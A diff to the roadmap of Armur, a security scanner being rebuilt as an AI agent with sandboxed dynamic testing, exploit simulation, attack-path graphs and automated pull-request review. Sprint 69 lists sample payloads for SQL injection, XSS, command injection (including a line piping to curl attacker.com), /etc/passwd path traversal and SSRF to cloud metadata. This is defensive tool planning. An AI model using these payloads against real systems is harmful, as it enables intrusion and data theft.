@@ -1,8 +1,10 @@
-# Armur Code Scanner — Improvement Roadmap
+# Armur Security Agent — Improvement Roadmap
 
-A comprehensive checklist of tasks to evolve Armur Code Scanner into a production-grade,
-widely-adopted open-source security scanning platform. Tasks are grouped by pillar and
-ordered by priority within each sprint.
+A comprehensive checklist of tasks to evolve Armur from a code scanner into the **Personal
+Security Agent for developers** — an autonomous agent that reads your code, runs it in a
+sandbox, simulates attacks, maps attack paths, and reviews every pull request. Built for the
+era of AI-generated code where automated security validation is essential.
+Tasks are grouped by pillar and ordered by priority within each sprint.
 
 ---
 
@@ -4470,5 +4472,678 @@ APIs (CISA, FIRST.org), or generate JSON files. Exact same patterns used through
 
 ---
 
+## Sprint 66 — Rebranding: From Code Scanner to Personal Security Agent
+
+The fundamental identity shift. Armur is no longer just a "code scanner" — it is a **Personal
+Security Agent for developers** that continuously watches, tests, and protects code. This sprint
+touches naming, messaging, packaging, CLI UX, and structural architecture to align with the new
+positioning. The key insight: AI-generated code is becoming the norm, and developers need an agent
+that automatically validates every change — not a tool they remember to run manually.
+
+### 66.1 Name & Identity
+
+- [ ] Rename the project from "Armur Code Scanner" to **"Armur — Personal Security Agent"**
+  - GitHub repo description: "Your personal security agent. SAST + DAST + exploit simulation + attack path analysis — all automated."
+  - Short form for docs and marketing: "Armur Security Agent" or just "Armur"
+  - CLI binary stays `armur` (no change needed)
+- [ ] Update `cmd/server/main.go` Swagger title: `Armur Security Agent API`
+- [ ] Update `cli/cmd/root.go` description:
+  ```go
+  Short: "Armur — Your Personal Security Agent",
+  Long:  "Armur is a personal security agent that reads your code, runs it in a sandbox, simulates attacks, and shows you exactly how to fix what it finds.",
+  ```
+- [ ] Update all `--help` text across every command to use "agent" language instead of "scanner"
+- [ ] Create `assets/logo/` with new logo variants (text-only, icon, banner) for README and docs
+- [ ] Update `IMPROVEMENTS.md` header to "Armur Security Agent — Improvement Roadmap"
+
+### 66.2 Go Module & Package Naming
+
+- [ ] Rename Go module from `armur-codescanner` to `armur` in `go.mod`
+- [ ] Rename CLI module from `armur-cli` to `armur-cli` (keep as-is — it's fine)
+- [ ] Update all internal import paths: `armur-codescanner/internal/...` → `armur/internal/...`
+- [ ] Update Docker image names: `armur/scanner` → `armur/agent` (keep `armur/scanner` as alias)
+- [ ] Update GitHub Actions references: `armur-ai/armur-scan-action` → `armur-ai/armur-action`
+
+### 66.3 CLI Experience: Agent-First UX
+
+- [ ] New default behavior: `armur` with no args → runs the security agent in watch mode for cwd
+  - Performs initial scan, then watches for file changes
+  - On each change: re-scans affected files, shows delta findings
+  - Agent stays running until Ctrl+C
+- [ ] `armur scan` still works as a one-shot command (backwards compatible)
+- [ ] `armur agent` — explicit alias for the always-on agent mode
+- [ ] `armur review <pr-url>` — review a specific PR (Sprint 71)
+- [ ] New CLI banner on startup:
+  ```
+  ╔═══════════════════════════════════════════════╗
+  ║  ARMUR — Personal Security Agent              ║
+  ║  Watching: ./my-project (Go)                  ║
+  ║  Mode: SAST + SCA | Press 'd' for DAST       ║
+  ╚═══════════════════════════════════════════════╝
+  ```
+- [ ] All output uses "agent" framing: "Armur found 3 issues" not "Scan found 3 issues"
+
+### 66.4 Messaging & Positioning Throughout Codebase
+
+- [ ] Update every user-facing string that says "scan" to use "analysis" or "security check" where appropriate
+  - API responses: `"status": "analyzing"` alongside existing `"status": "pending"` for backwards compat
+  - CLI output: "Armur is analyzing your code..." instead of "Waiting for scan to complete..."
+- [ ] Update error messages to be agent-contextual: "Armur couldn't reach the server" not "Error making API request"
+- [ ] Update all `.armur.yml` documentation to frame as "agent configuration" not "scan configuration"
+- [ ] Add a `--why` flag to every finding display: shows a one-sentence explanation of why this matters specifically for AI-generated code
+
+### 66.5 Structural Preparation
+
+- [ ] Add `Finding.Source` field across the pipeline: `"sast"` | `"dast"` | `"sca"` | `"secrets"` | `"iac"` | `"exploit"` | `"attack_path"`
+- [ ] Add `Finding.Confirmed` boolean: `true` when DAST or exploit simulation has verified the finding
+- [ ] Add `ScanMode` enum: `"sast_only"` | `"sast_sca"` | `"full_agent"` (SAST + DAST + exploit)
+- [ ] Extend `.armur.yml` schema with agent config section:
+  ```yaml
+  agent:
+    mode: full            # sast_only | sast_sca | full_agent
+    auto_dast: true       # automatically run DAST when a runnable app is detected
+    auto_exploit: false   # automatically simulate exploits (opt-in, requires sandbox)
+    watch: true           # watch for file changes and re-analyze
+    pr_review: true       # automatically review PRs when integrated with GitHub
+  ```
+- [ ] Add `internal/agent/` package as the top-level orchestrator that coordinates SAST → DAST → Exploit → Attack Path
+
+---
+
+## Sprint 67 — AI Intelligence Layer (Claude API + Local LLMs)
+
+Every intelligent feature in Armur (tech stack detection, exploit generation, attack path reasoning,
+PR review) requires an AI backbone. This sprint builds the pluggable AI integration layer that
+supports Claude API, local LLMs via Ollama, and user choice.
+
+### 67.1 AI Provider Abstraction
+
+- [ ] Create `internal/ai/provider.go` — defines the provider interface:
+  ```go
+  type AIProvider interface {
+      Complete(ctx context.Context, prompt string, opts CompletionOpts) (string, error)
+      Stream(ctx context.Context, prompt string, opts CompletionOpts) (<-chan string, error)
+      Name() string
+      Available() bool
+  }
+
+  type CompletionOpts struct {
+      MaxTokens   int
+      Temperature float64
+      SystemPrompt string
+  }
+  ```
+- [ ] Implement `internal/ai/claude.go` — Claude API provider:
+  - Uses `github.com/anthropic-ai/anthropic-sdk-go` (official Go SDK)
+  - Default model: `claude-sonnet-4-6` for speed; `claude-opus-4-6` for complex reasoning (exploit gen)
+  - Reads API key from: `ANTHROPIC_API_KEY` env var → `~/.armur/config.json` → prompt user
+- [ ] Implement `internal/ai/ollama.go` — Ollama local LLM provider:
+  - Connects to Ollama HTTP API at `http://localhost:11434`
+  - Default model: `llama3.1:8b` (good balance of speed and quality)
+  - Auto-detect if Ollama is running; if not, offer to install it
+- [ ] Implement `internal/ai/router.go` — provider router:
+  - User configures preferred provider in `~/.armur/config.json` or `.armur.yml`
+  - Fallback chain: user preference → Claude API (if key available) → Ollama (if running) → offline mode (no AI)
+  - Each AI-powered feature specifies minimum capability level; router picks the best available provider
+
+### 67.2 User Configuration & Key Management
+
+- [ ] `armur config set ai-provider claude` / `armur config set ai-provider ollama` / `armur config set ai-provider auto`
+- [ ] `armur config set anthropic-api-key <key>` — securely stores the Claude API key
+  - Key stored in `~/.armur/credentials` with `0600` permissions (not in `config.json`)
+  - Support `ANTHROPIC_API_KEY` env var as override
+- [ ] `armur config set ollama-model <model>` — configure which Ollama model to use (default: `llama3.1:8b`)
+- [ ] `armur config set ollama-url <url>` — for remote Ollama instances (default: `http://localhost:11434`)
+- [ ] Add `.armur.yml` AI configuration:
+  ```yaml
+  ai:
+    provider: auto          # claude | ollama | auto | none
+    claude:
+      model: claude-sonnet-4-6
+      # API key read from env or ~/.armur/credentials — never stored in .armur.yml
+    ollama:
+      model: llama3.1:8b
+      url: http://localhost:11434
+    features:
+      explain: true         # enable armur explain
+      fix: true             # enable armur fix
+      fp_filter: false      # enable false positive filtering
+      exploit_gen: true     # enable exploit generation (requires claude or large local model)
+      tech_detection: true  # enable AI-powered tech stack detection for DAST
+  ```
+
+### 67.3 Local LLM Bootstrap
+
+- [ ] `armur setup ai` — interactive wizard for AI setup:
+  1. "How would you like to power Armur's AI features?"
+     - "Use Claude API (best quality, requires API key)" → prompt for key
+     - "Use a local LLM via Ollama (free, private, runs on your machine)" → check/install Ollama
+     - "No AI features (Armur works fine without them, just no explain/fix/exploit features)"
+  2. If Ollama selected:
+     - Check if Ollama is installed; if not: `brew install ollama` (macOS) or provide install link
+     - Check if the selected model is downloaded; if not: `ollama pull llama3.1:8b`
+     - Run a quick test prompt to verify the model works
+     - Save config
+  3. Print summary: "AI configured! Armur will use [Claude API / Ollama llama3.1:8b] for intelligent features."
+- [ ] `armur doctor` extended: check AI provider health (API key valid, Ollama reachable, model loaded)
+
+### 67.4 AI-Powered Tech Stack Detection
+
+- [ ] Create `internal/ai/techdetect.go` — uses AI to analyze a project and determine:
+  - Primary language and framework (e.g., "Go + Gin", "Python + FastAPI", "Node.js + Express")
+  - Build system (go build, npm, pip, cargo, maven, gradle)
+  - How to build the project (specific commands)
+  - How to run the project (specific commands, ports, env vars needed)
+  - Database dependencies (PostgreSQL, MySQL, Redis, MongoDB, etc.)
+  - External service dependencies (S3, Stripe, Twilio, etc.)
+- [ ] Input: project file listing + key file contents (go.mod, package.json, Dockerfile, docker-compose.yml, README)
+- [ ] Output: structured `TechProfile` JSON used by the DAST sandbox engine (Sprint 68)
+- [ ] Fallback when no AI available: heuristic-based detection from file extensions and manifests (already exists, just less smart about framework/port detection)
+
+---
+
+## Sprint 68 — Sandboxed DAST: Intelligent Runtime Testing
+
+Full-blown DAST that goes far beyond "scan a URL." Armur auto-detects the tech stack, creates an
+isolated sandbox, builds and runs the application, waits for it to be healthy, then hammers it
+with dynamic security tests. This is the feature that makes Armur a true security agent.
+
+### 68.1 Sandbox Environment Engine
+
+- [ ] Create `internal/sandbox/sandbox.go` — manages isolated execution environments:
+  ```go
+  type Sandbox struct {
+      ID          string
+      ProjectPath string
+      TechProfile TechProfile
+      ContainerID string
+      Port        int
+      BaseURL     string
+      Status      string  // "creating", "building", "running", "healthy", "failed", "destroyed"
+  }
+
+  func Create(ctx context.Context, projectPath string, profile TechProfile) (*Sandbox, error)
+  func (s *Sandbox) Build(ctx context.Context) error
+  func (s *Sandbox) Start(ctx context.Context) error
+  func (s *Sandbox) WaitHealthy(ctx context.Context, timeout time.Duration) error
+  func (s *Sandbox) BaseURL() string
+  func (s *Sandbox) Destroy(ctx context.Context) error
+  ```
+- [ ] Sandbox uses Docker to isolate the application:
+  - Auto-generate a `Dockerfile` if one doesn't exist (using AI tech detection results)
+  - Build the application inside the container
+  - Run it with network isolation (only accessible from the host)
+  - Map the application port to a random available host port
+- [ ] For Docker Compose projects: use `docker compose up` instead of building a single container
+- [ ] Resource limits: CPU (2 cores max), memory (2GB max), disk (5GB max), network (no external access)
+- [ ] Timeout: sandbox auto-destroys after 10 minutes (configurable via `dast.sandbox_timeout` in `.armur.yml`)
+- [ ] Cleanup: always destroy sandbox on completion, cancellation, or error (defer-based)
+
+### 68.2 Intelligent Dockerfile Generation
+
+- [ ] When no Dockerfile exists, use the `TechProfile` from Sprint 67.4 to generate one:
+  - **Go**: `golang:1.22-alpine` → `go build` → `scratch` or `alpine` runtime
+  - **Python (Flask/FastAPI/Django)**: `python:3.12-slim` → `pip install -r requirements.txt` → `CMD`
+  - **Node.js (Express/Next.js/Nest)**: `node:20-slim` → `npm install` → `npm start`
+  - **Java (Spring Boot)**: `maven:3.9-eclipse-temurin-21` → `mvn package` → `openjdk:21-jre-slim`
+  - **Ruby (Rails)**: `ruby:3.3-slim` → `bundle install` → `rails server`
+  - **Rust**: `rust:1.76` → `cargo build --release` → `debian:bookworm-slim`
+  - **PHP (Laravel)**: `php:8.3-fpm` → `composer install` → with nginx sidecar
+- [ ] AI-enhanced Dockerfile generation: send project structure to AI provider and ask for optimal Dockerfile
+- [ ] If AI is not available: use template-based generation from the detected framework
+- [ ] Store generated Dockerfile in `~/.armur/sandbox/<sandbox-id>/Dockerfile` (not in the project)
+- [ ] Handle projects with `docker-compose.yml`: parse it, identify the main service, use existing compose
+
+### 68.3 Application Health Detection
+
+- [ ] After starting the sandbox, probe for application readiness:
+  1. TCP connect to the mapped port (retry every 500ms, max 60s)
+  2. HTTP GET `/` — check for any non-connection-error response
+  3. HTTP GET common health endpoints: `/health`, `/healthz`, `/api/health`, `/ping`, `/ready`
+  4. If health check path detected in code (via grep/AI): use that specific endpoint
+- [ ] Parse application stdout for startup messages: "Listening on port", "Server started", "Ready to accept connections"
+- [ ] If the app fails to start: capture stdout/stderr, report as a finding:
+  "Application failed to start in sandbox — DAST could not be performed. Build error: [...]"
+- [ ] If AI is available: analyze the build/startup failure and suggest a fix
+
+### 68.4 Dynamic Security Testing Suite
+
+- [ ] Once the app is healthy, run a layered DAST test suite:
+
+  **Layer 1 — Passive Discovery (always runs, <30s):**
+  - Spider/crawl the application from the root URL using a headless crawler
+  - Discover all routes, forms, API endpoints, authentication pages
+  - Detect technology headers (X-Powered-By, Server, framework fingerprints)
+  - Check security headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
+  - Check cookie attributes: HttpOnly, Secure, SameSite
+  - Check CORS configuration: open `*` origins, credential leaks
+
+  **Layer 2 — Active Probing (opt-in or auto for non-prod, ~2-5min):**
+  - SQL injection probes on all detected input parameters (forms, query params, JSON bodies)
+  - XSS probes: reflected and stored XSS payloads on all input points
+  - Command injection probes on parameters that could reach exec paths
+  - Path traversal probes (`../../etc/passwd`) on file-related parameters
+  - SSRF probes: inject internal IP addresses in URL-accepting parameters
+  - Authentication bypass: try accessing protected endpoints without auth headers
+  - IDOR probes: iterate sequential IDs on resource endpoints
+  - Rate limiting check: send 100 rapid requests to login endpoint
+  - Error disclosure: trigger errors and check for stack traces / debug info in responses
+
+  **Layer 3 — Known CVE Exploitation (via Nuclei, ~1-2min):**
+  - Run Nuclei against the sandbox URL with templates matching the detected tech stack
+  - Focus on: framework CVEs, exposed admin panels, default credentials, misconfiguration
+  - `nuclei -u <sandbox-url> -t cves/ -t exposed-panels/ -t misconfigurations/ -severity medium,high,critical -j`
+
+  **Layer 4 — ZAP Deep Scan (opt-in, ~5-10min):**
+  - If ZAP is available and depth=deep: run ZAP active scan
+  - `docker run owasp/zap2docker-stable zap-full-scan.py -t <sandbox-url> -J results.json`
+  - Merge ZAP findings with Armur findings, deduplicating by endpoint+vulnerability type
+
+- [ ] All DAST findings tagged with `Finding.Source = "dast"` and `Finding.Confirmed = true`
+- [ ] DAST findings include the HTTP request/response that triggered the vulnerability
+
+### 68.5 CLI Integration
+
+- [ ] `armur dast <path>` — run DAST against a local project:
+  1. Detect tech stack (AI or heuristic)
+  2. Create sandbox
+  3. Build and start application
+  4. Run DAST test suite
+  5. Destroy sandbox
+  6. Display findings
+- [ ] `armur scan <path> --dast` — add DAST to a regular SAST scan (runs SAST first, then DAST)
+- [ ] `armur scan <path> --full-agent` — SAST + SCA + DAST + Exploit Simulation (Sprint 69)
+- [ ] `armur dast --url <url>` — run DAST against an already-running service (skip sandbox creation)
+- [ ] Progress display during DAST: show sandbox status, test layer progress, findings as they arrive
+- [ ] `.armur.yml` DAST configuration:
+  ```yaml
+  dast:
+    enabled: true
+    auto_sandbox: true        # auto-create sandbox (false = require --url)
+    layers: [passive, active, nuclei]  # which layers to run (default: all except zap)
+    sandbox_timeout: 600      # seconds before sandbox auto-destroys
+    port_hint: 8080           # hint for which port the app listens on
+    env:                      # environment variables for the sandbox
+      DATABASE_URL: "sqlite:///tmp/test.db"
+      SECRET_KEY: "test-secret-for-dast"
+    auth:                     # authentication for protected endpoints
+      type: bearer            # bearer | basic | form | cookie
+      token: "${DAST_TOKEN}"  # use env var for secrets
+    exclude_paths:            # don't test these paths
+      - /admin/delete-all
+      - /api/v1/dangerous-endpoint
+  ```
+
+---
+
+## Sprint 69 — Exploit Simulation & Proof-of-Concept Engine
+
+Move beyond "we found a vulnerability" to "here's exactly how an attacker exploits it."
+Armur generates safe, sandboxed exploit proof-of-concepts that confirm SAST findings are real
+and show developers the actual impact. This transforms theoretical findings into visceral,
+undeniable evidence.
+
+### 69.1 Exploit Generation Engine
+
+- [ ] Create `internal/exploit/generator.go` — generates PoC exploits from findings:
+  ```go
+  type ExploitPoC struct {
+      FindingID   string   `json:"finding_id"`
+      Type        string   `json:"type"`        // "sql_injection", "xss", "rce", etc.
+      Description string   `json:"description"` // what the exploit does
+      Steps       []Step   `json:"steps"`       // ordered attack steps
+      Payload     string   `json:"payload"`     // the actual exploit payload
+      HTTPRequest *HTTPReq `json:"http_request,omitempty"` // for web exploits
+      Script      string   `json:"script"`      // executable PoC script (bash/python)
+      Impact      string   `json:"impact"`      // what an attacker gains
+      Severity    string   `json:"severity"`    // confirmed severity after simulation
+  }
+  ```
+- [ ] **Template-based exploit generation** (works without AI):
+  - SQL injection: generate payloads for the specific database type detected (PostgreSQL, MySQL, SQLite)
+    - Union-based extraction: `' UNION SELECT username, password FROM users --`
+    - Boolean-based blind: `' AND 1=1 --` vs `' AND 1=2 --`
+    - Time-based blind: `'; WAITFOR DELAY '0:0:5' --`
+  - XSS: generate context-aware payloads (HTML context, attribute context, JavaScript context)
+    - Reflected: `<script>alert(document.cookie)</script>`
+    - DOM-based: `javascript:alert(1)` in URL fragments
+  - Command injection: generate OS-specific payloads (Linux/Windows)
+    - `; id`, `` `whoami` ``, `$(cat /etc/passwd)`, `| curl attacker.com`
+  - Path traversal: `../../etc/passwd`, `..\..\windows\system32\drivers\etc\hosts`
+  - SSRF: `http://169.254.169.254/latest/meta-data/` (AWS metadata)
+  - Deserialization: language-specific gadget chains
+  - Auth bypass: JWT none algorithm, SQL injection in login, default credentials
+
+- [ ] **AI-enhanced exploit generation** (when AI provider available):
+  - Send the finding context (code snippet, endpoint, parameter) to the AI
+  - Prompt: "Generate a safe, sandboxed proof-of-concept exploit for this [vulnerability type] in [language/framework]. The PoC should demonstrate impact without causing real damage. Include the exact HTTP request or code to reproduce."
+  - AI generates more sophisticated, context-aware exploits than templates
+  - Validate AI output: ensure it doesn't contain destructive payloads (no `rm -rf`, no actual data exfiltration to external URLs)
+
+### 69.2 Safe Exploit Execution
+
+- [ ] Exploits ONLY run inside the sandbox from Sprint 68 (never against production)
+- [ ] Create `internal/exploit/runner.go` — executes PoCs safely:
+  ```go
+  type ExploitResult struct {
+      PoCID       string `json:"poc_id"`
+      Success     bool   `json:"success"`      // did the exploit work?
+      Evidence    string `json:"evidence"`      // what happened (response body, output, etc.)
+      Screenshot  string `json:"screenshot"`    // base64 screenshot if web-based
+      HTTPLog     []HTTPExchange `json:"http_log"` // full request/response log
+      Severity    string `json:"confirmed_severity"` // severity after confirmation
+  }
+  ```
+- [ ] Execution isolation:
+  - All exploit HTTP requests go only to the sandbox URL (enforce via URL validation)
+  - No network access to external hosts from exploit scripts
+  - Exploit scripts run inside a separate container (not the same as the app sandbox)
+  - 30-second timeout per exploit attempt
+  - Capture all HTTP traffic (request + response) as evidence
+- [ ] Severity escalation: if a MEDIUM SAST finding is confirmed exploitable → escalate to HIGH or CRITICAL
+- [ ] Severity downgrade: if exploit fails → add `Finding.ExploitResult = "not_exploitable"` (doesn't remove the finding, but lowers priority)
+
+### 69.3 Exploit Report & Evidence
+
+- [ ] Each confirmed exploit generates an evidence package:
+  - The exact HTTP request(s) that triggered the vulnerability
+  - The server response proving exploitation (e.g., extracted data, error message, timing difference)
+  - Step-by-step reproduction instructions
+  - Remediation: specific code change to fix the vulnerability
+- [ ] Display in CLI:
+  ```
+  ┌─────────────────────────────────────────────────────┐
+  │  [CONFIRMED] SQL Injection — api/handlers.go:42     │
+  │  Severity: CRITICAL (confirmed via exploit)         │
+  ├─────────────────────────────────────────────────────┤
+  │  Exploit: Union-based SQL injection via 'id' param  │
+  │  Request: POST /api/users?id=1' UNION SELECT...     │
+  │  Impact:  Full database read access                 │
+  │  Fix:     Use parameterized query (see suggestion)  │
+  └─────────────────────────────────────────────────────┘
+  ```
+- [ ] HTML report includes exploit evidence as collapsible sections with syntax-highlighted HTTP logs
+- [ ] `armur exploit <finding-id>` — generate and run an exploit for a specific finding
+
+### 69.4 Exploit Simulation Modes
+
+- [ ] **Auto mode** (default in `full_agent`): automatically attempt exploits for all HIGH/CRITICAL SAST findings that have DAST-reachable endpoints
+- [ ] **Manual mode**: `armur exploit <finding-id>` — run a specific exploit interactively
+- [ ] **Dry-run mode**: `armur exploit --dry-run` — generate exploit PoCs and show what would be attempted, but don't execute them
+- [ ] **CI mode**: `armur scan --full-agent --exploit-confirm` — run exploits in CI pipeline, fail on confirmed exploits
+- [ ] `.armur.yml` configuration:
+  ```yaml
+  exploit:
+    enabled: false            # opt-in (default off for safety)
+    auto_for_severity: high   # auto-exploit findings at this severity or above
+    max_attempts: 5           # max exploit attempts per finding
+    timeout_per_exploit: 30   # seconds
+    dry_run: false            # generate but don't execute
+  ```
+
+---
+
+## Sprint 70 — Attack Path Analysis & Visualization
+
+Individual findings are noise. Attack paths are signal. This sprint connects findings into attack
+graphs that show developers: "An attacker starts here, chains these 3 issues, and ends up with
+full database access." This is what converts a vulnerability report into a story that drives action.
+
+### 70.1 Attack Graph Construction
+
+- [ ] Create `internal/attackpath/graph.go`:
+  ```go
+  type AttackGraph struct {
+      Nodes []AttackNode `json:"nodes"`
+      Edges []AttackEdge `json:"edges"`
+      Paths []AttackPath `json:"paths"`
+  }
+
+  type AttackNode struct {
+      ID        string   `json:"id"`
+      FindingID string   `json:"finding_id,omitempty"` // links to a Finding
+      Type      string   `json:"type"`     // "entry_point", "vulnerability", "privilege", "asset"
+      Label     string   `json:"label"`
+      Severity  string   `json:"severity"`
+  }
+
+  type AttackEdge struct {
+      From      string `json:"from"`
+      To        string `json:"to"`
+      Label     string `json:"label"`   // "exploits", "leads_to", "escalates_to", "accesses"
+      Technique string `json:"technique"` // MITRE ATT&CK technique ID if applicable
+  }
+
+  type AttackPath struct {
+      ID          string   `json:"id"`
+      Name        string   `json:"name"`        // "Unauthenticated DB Access via SQLi"
+      Severity    string   `json:"severity"`     // highest severity in the path
+      NodeIDs     []string `json:"node_ids"`     // ordered path through the graph
+      Impact      string   `json:"impact"`       // what the attacker achieves
+      Likelihood  string   `json:"likelihood"`   // high/medium/low based on complexity
+      Description string   `json:"description"`  // narrative description
+  }
+  ```
+- [ ] **Entry point detection**: identify attack surface from the code:
+  - HTTP endpoints (parsed from router definitions: Gin, Express, Flask, Spring, etc.)
+  - CLI argument handlers
+  - File upload handlers
+  - WebSocket handlers
+  - Message queue consumers
+  - Cron jobs with external input
+- [ ] **Vulnerability chaining rules** (hand-crafted + AI-augmented):
+  - SSRF + cloud metadata endpoint → credential theft → lateral movement
+  - SQL injection + admin table → authentication bypass → full data access
+  - XSS + session cookie without HttpOnly → session hijacking → account takeover
+  - Path traversal + config file read → credential disclosure → privilege escalation
+  - Insecure deserialization + network access → remote code execution
+  - Weak JWT + no audience validation → token forgery → impersonation
+  - Command injection + network access → reverse shell → full system compromise
+  - Dependency vulnerability (known RCE CVE) + internet-facing service → pre-auth RCE
+- [ ] Build the graph automatically after SAST + DAST results are collected
+- [ ] When AI is available: send findings to AI for additional chain discovery that rules can't catch
+
+### 70.2 Attack Path Scoring
+
+- [ ] Score each attack path based on:
+  ```
+  path_score = base_impact_score
+             × chain_complexity_factor    (fewer steps = higher score)
+             × confirmation_multiplier    (2.0 if any step is DAST-confirmed, 1.0 otherwise)
+             × exposure_factor            (1.5 if entry point is internet-facing, 1.0 if internal)
+             × authentication_factor      (1.5 if no auth required, 1.0 if auth required)
+  ```
+- [ ] Rank paths by score; present the top 5 as the "critical attack paths"
+- [ ] Add `Finding.AttackPaths []string` — list of attack path IDs that include this finding
+- [ ] Findings that appear in multiple attack paths get a priority boost
+
+### 70.3 Visualization: Mermaid Diagrams
+
+- [ ] Generate Mermaid flowchart syntax for each attack path:
+  ```mermaid
+  graph LR
+    A[Internet User] -->|POST /api/search| B[Search Endpoint]
+    B -->|SQLi in 'query' param| C[SQL Injection]
+    C -->|UNION SELECT| D[Database Read Access]
+    D -->|Extract users table| E[Credential Theft]
+    E -->|Admin password| F[Admin Panel Access]
+    style C fill:#ff4444
+    style E fill:#ff4444
+    style F fill:#ff0000
+  ```
+- [ ] Include Mermaid diagrams in:
+  - HTML reports (rendered via Mermaid.js CDN or inline SVG)
+  - Markdown reports (raw Mermaid code blocks — GitHub renders them natively)
+  - CLI output (as ASCII-art graph using box-drawing characters)
+- [ ] `armur attack-paths --task <id>` — display attack paths with ASCII visualization
+- [ ] `armur attack-paths --task <id> --format mermaid` — output raw Mermaid for pasting into docs
+
+### 70.4 Interactive Attack Path Browser (TUI)
+
+- [ ] Extend the Bubbletea TUI (Sprint 8) with an "Attack Paths" tab:
+  - Left panel: list of attack paths sorted by score, with severity badge
+  - Right panel: ASCII graph visualization of the selected path
+  - Press Enter on a path → expand to show each node's finding details
+  - Press `m` → copy Mermaid diagram to clipboard
+  - Press `e` → export attack path as SVG (render Mermaid locally if `mmdc` is installed)
+- [ ] Summary card includes attack path count: "3 critical attack paths identified"
+
+### 70.5 Attack Path in CI/CD
+
+- [ ] `--fail-on-attack-path` flag: fail the CI build if any attack path with score above threshold exists
+- [ ] Attack paths included in SARIF output as related locations (GitHub Code Scanning shows the chain)
+- [ ] PR comment (when GitHub App is integrated) includes the top attack path:
+  ```
+  ## Attack Path Detected
+  **Unauthenticated Database Access** (Critical)
+
+  Internet → POST /api/search → SQL Injection (search.go:42) → Database Read → Credential Theft
+
+  This PR introduces a SQL injection that enables full database access without authentication.
+  ```
+
+---
+
+## Sprint 71 — PR Security Agent: Autonomous Code Review
+
+The crown jewel. Armur acts as an autonomous security reviewer on every pull request. It reads
+the diff, runs SAST on the changes, spins up a sandbox for DAST, simulates exploits, maps attack
+paths, and posts a comprehensive security review — all without any human intervention. This is
+what "Personal Security Agent" means in practice.
+
+### 71.1 PR Review Engine
+
+- [ ] Create `internal/agent/pr_review.go` — the PR review orchestrator:
+  ```go
+  type PRReview struct {
+      PRURL       string
+      BaseBranch  string
+      HeadBranch  string
+      ChangedFiles []string
+      SASTFindings []Finding
+      DASTFindings []Finding
+      ExploitResults []ExploitResult
+      AttackPaths  []AttackPath
+      AICommentary string     // AI-generated review narrative
+      Verdict      string     // "approve", "request_changes", "comment"
+  }
+
+  func ReviewPR(ctx context.Context, prURL string, opts ReviewOpts) (*PRReview, error)
+  ```
+- [ ] Review pipeline:
+  1. **Fetch PR diff**: clone repo, checkout PR branch, compute changed files vs base
+  2. **SAST scan**: run full SAST on changed files only (diff mode)
+  3. **SCA check**: check if any new dependencies were added; run vulnerability check on new deps only
+  4. **Secrets scan**: scan the diff for newly introduced secrets (not existing ones)
+  5. **DAST** (if applicable): if the PR changes API endpoints or adds new routes:
+     - Build sandbox from the PR branch
+     - Run DAST against the sandbox
+     - Focus tests on endpoints modified in the PR
+  6. **Exploit simulation** (if enabled): attempt exploits for any HIGH/CRITICAL findings
+  7. **Attack path analysis**: check if the PR introduces new attack paths or extends existing ones
+  8. **AI review narrative**: use AI provider to generate a developer-friendly review summary
+  9. **Verdict determination**: auto-approve if no HIGH/CRITICAL findings; request changes otherwise
+
+### 71.2 GitHub PR Integration
+
+- [ ] `armur review <pr-url>` CLI command:
+  - Accepts GitHub PR URL: `armur review https://github.com/owner/repo/pull/123`
+  - Runs the full review pipeline locally
+  - Prints results to terminal
+  - Optionally posts review comment: `armur review <pr-url> --post-comment`
+- [ ] GitHub App webhook handler (extends Sprint 38.1):
+  - On `pull_request.opened` / `pull_request.synchronize`: automatically trigger review
+  - Post review as a GitHub PR review (not just a comment):
+    - Inline comments on specific lines where findings are located
+    - Review summary at the top with severity table + attack paths
+    - Review verdict: "Approve" / "Request Changes" based on findings
+- [ ] PR review comment format:
+  ```markdown
+  ## Armur Security Review
+
+  **Verdict: Request Changes** — 2 critical issues found
+
+  ### Summary
+  | Category | New Findings |
+  |----------|-------------|
+  | 🔴 Critical | 1 |
+  | 🟠 High | 1 |
+  | 🟡 Medium | 3 |
+  | Security Score | 42/100 (was 78/100 on main) |
+
+  ### Critical Attack Path
+  This PR introduces a SQL injection in `search.go:42` that enables unauthenticated
+  database access. See inline comments for details.
+
+  ### DAST Results
+  ✅ Sandbox test passed for 12/15 endpoints
+  ❌ 3 endpoints vulnerable (see inline comments)
+
+  ### What to Fix
+  1. Use parameterized query in `search.go:42` (see suggested fix)
+  2. Add input validation for `userID` parameter in `users.go:87`
+
+  ---
+  🤖 Reviewed by [Armur Security Agent](https://armur.ai)
+  ```
+
+### 71.3 AI-Generated Review Narrative
+
+- [ ] After all analysis is complete, send the full finding set to the AI provider:
+  - Prompt: "You are a senior security engineer reviewing a pull request. Based on these findings, write a clear, actionable review. Focus on: what's most dangerous, why it matters, and exactly how to fix it. Be direct but not condescending."
+  - Include: PR description, changed files summary, all findings with code context
+  - The AI narrative is the "voice" of the security agent — it should sound like a helpful colleague
+- [ ] Tone configuration in `.armur.yml`:
+  ```yaml
+  agent:
+    review_tone: helpful     # helpful | strict | minimal
+  ```
+  - `helpful`: full explanations with fix suggestions (default)
+  - `strict`: just the facts, no suggestions (for compliance-focused teams)
+  - `minimal`: one-line per finding, verdict only
+
+### 71.4 Continuous PR Watching
+
+- [ ] `armur agent --watch-prs` — continuously watch for new PRs and review them automatically
+  - Requires GitHub App installation or a personal access token
+  - Polls for new PRs every 60 seconds (configurable)
+  - Reviews each new PR and update automatically
+  - Runs as a background daemon: `armur agent --watch-prs --daemon`
+- [ ] GitLab MR support: `armur agent --watch-mrs --gitlab-url <url> --token <token>`
+- [ ] Status: show active watchers in `armur status`:
+  ```
+  Armur Security Agent — Active
+  Watching: github.com/myorg/myapp (3 PRs reviewed today)
+  Last review: PR #142 — 2 findings, Request Changes
+  ```
+
+### 71.5 PR Review in CI/CD
+
+- [ ] GitHub Actions integration:
+  ```yaml
+  - uses: armur-ai/armur-action@v2
+    with:
+      mode: pr-review
+      post-review: true
+      fail-on-severity: high
+      dast: true
+      exploit-simulation: false  # opt-in for CI
+    env:
+      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+  ```
+- [ ] GitLab CI template:
+  ```yaml
+  armur-review:
+    image: armur/agent:latest
+    script:
+      - armur review --post-comment --fail-on-severity high
+    rules:
+      - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+  ```
+- [ ] Support for all CI platforms from Sprint 40 (CircleCI, Jenkins, Azure DevOps, Bitbucket)
+
+---
+
 *Last updated: March 2026*
